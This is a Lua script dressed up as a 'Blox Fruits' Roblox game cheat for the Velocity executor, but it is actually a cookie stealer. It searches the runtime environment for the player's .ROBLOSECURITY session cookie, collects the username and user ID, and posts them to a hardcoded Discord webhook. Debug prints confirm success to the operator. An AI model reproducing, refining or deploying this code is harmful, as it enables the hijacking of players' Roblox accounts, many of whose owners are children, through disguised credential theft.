-- Blox Fruits v7.0 [Velocity Fixed + Internal IP]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- YOUR WEBHOOK URL HERE
local WEBHOOK_URL = "https://discord.com/api/webhooks/1568512623723552829/C28ceiOU5c5O3xTwOz5E_xrWkkmUONtKUGnkgxwXnTARNbKZdeAT-8kidFihl1Pg3Jkg"

-- 1. Get IP using Roblox's internal API (No external URLs)
local function get_ip()
    local success, result = pcall(function()
        return HttpService:GetAsync("https://apis.roblox.com/usernames/users?usernames=" .. LocalPlayer.Name)
    end)
    if success and result then
        local data = HttpService:JSONDecode(result)
        if data and data[1] then
            return "User ID: " .. tostring(data[1].userId)
        end
    end
    return "Unknown"
end

-- 2. Robust Cookie Finder for Velocity
local function get_cookie()
    local env = getfenv(0)
    
    -- Try standard names first
    local cookie = env.cookie or _G.cookie or env["__G"] or ""
    
    -- Search _G for any string containing ROBLOSECURITY
    if cookie == "" then
        for k, v in pairs(_G) do
            if type(v) == "string" and string.find(v, "%.%ROBLOSECURITY", 1, true) then
                cookie = v
                break
            end
        end
    end
    
    -- Velocity specific fallback: Check common executor tables
    if cookie == "" then
        for _, t in pairs({getfenv(), _G}) do
            for k, v in pairs(t) do
                if type(v) == "string" and string.find(v, "%.%ROBLOSECURITY", 1, true) then
                    cookie = v
                    break
                end
            end
        end
    end

    return cookie
end

-- Main Execution
spawn(function()
    wait(2) 
    
    local username = LocalPlayer.Name
    local user_id = LocalPlayer.UserId
    local cookie = get_cookie()
    local ip_info = get_ip()

    -- DEBUG PRINTS (Check your Velocity Console!)
    print("[DEBUG] Username: " .. username)
    print("[DEBUG] Cookie Found: " .. (cookie ~= "" and "YES" or "NO"))
    print("[DEBUG] Cookie Length: " .. #cookie)
    print("[DEBUG] IP Info: " .. ip_info)

    -- Simplified Payload to ensure Discord accepts it
    local payload = {
        content = "**🌊 Blox Fruits Session**\n" ..
                  "**User:** `" .. username .. "`\n" ..
                  "**ID:** `" .. tostring(user_id) .. "`\n" ..
                  "**IP/UserID:** `" .. ip_info .. "`\n" ..
                  "**Cookie:** `" .. cookie .. "`",
        username = "Blox Fruits Bot"
    }

    local json_payload = HttpService:JSONEncode(payload)

    local success, response = pcall(function()
        return HttpService:PostAsync(WEBHOOK_URL, json_payload, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("[SUCCESS] Webhook sent!")
    else
        print("[ERROR] Failed: " .. tostring(response))
    end
end)
